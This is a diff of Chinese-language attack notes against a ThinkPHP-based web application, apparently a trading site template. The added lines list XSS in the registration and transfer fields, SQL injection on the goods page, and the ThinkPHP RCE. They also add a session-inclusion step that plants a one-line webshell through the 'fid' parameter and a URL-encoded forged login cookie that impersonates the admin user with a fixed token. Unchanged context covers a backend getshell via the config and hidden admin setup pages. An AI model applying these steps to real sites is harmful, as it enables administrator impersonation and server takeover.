@@ -9,16 +9,19 @@
 用户在前端登陆后访问的是伪静态页面，如good/pid/2/token/xxxxxxx.html
 登陆页面：/passport/login/index/?lang=zh-cn
 	     /index/login/login/token/xxxxxxxx.html
+
 ```
 
 RCE：
 
 ```
-1.用户注册填信息的地方存在xss
+1.用户注册填信息的地方存在xss,充值转帐姓名处存在xss
 2.商品行情页面good/pid/2 存在sql注入
 3.以thinkphp框架二次开发的框架，存在thinkphp的RCE
 4.thinkphp的日志泄露，搜索error可能找到sql注入的地方
 5.其他漏洞：https://www.cnblogs.com/-qing-/p/10693139.html
+6.session包含getshell （需要配合tp5rce的文件包含）
+	/index/goods/goods?fid=一句话  #写入session里面
 ```
 
 基本信息
@@ -48,6 +51,8 @@ RCE：
 
 ```
 denglu=think:{"otype":"3","userid":"","username":"","token":"3c341b110c44ad9e7da4160e4f865b63"}
+或者
+denglu=think%3A%7B%22otype%22%3A%223%22%2C%22userid%22%3A%221%22%2C%22username%22%3A%22admin%22%2C%22token%22%3A%223c341b110c44ad9e7da4160e4f865b63%22%7D
 ```
 
 后台get5he11 -1
@@ -74,7 +79,8 @@ phpinfo();//
 /runtime/cache/3a/8e4c06e471595f6eb262bb9b5582d9.php
 
 PS：如果没有参数设置，可能只是删除了导航，没有删除实际功能
+后台路径一般为admin
 可以直接访问/后台路径/setup/addsetup.html  添加配置
-/admin/setup/deploy.html   # 删除参数
+/后台路径/setup/deploy.html   # 删除参数页面
 ```
 
